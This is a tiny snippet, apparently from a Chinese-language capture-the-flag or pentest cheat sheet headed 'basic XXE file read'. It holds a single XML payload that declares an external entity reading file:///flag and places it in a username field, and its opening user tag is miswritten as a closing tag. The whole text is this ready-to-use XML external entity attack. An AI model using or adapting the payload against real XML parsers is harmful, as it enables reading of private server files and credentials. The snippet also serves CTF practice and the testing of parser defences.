* 基本的XXE读文件

```xml
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE creds [  
<!ENTITY goodies SYSTEM "file:///flag"> ]> 
</user><username>&goodies;</username><password>password</password></user>
```

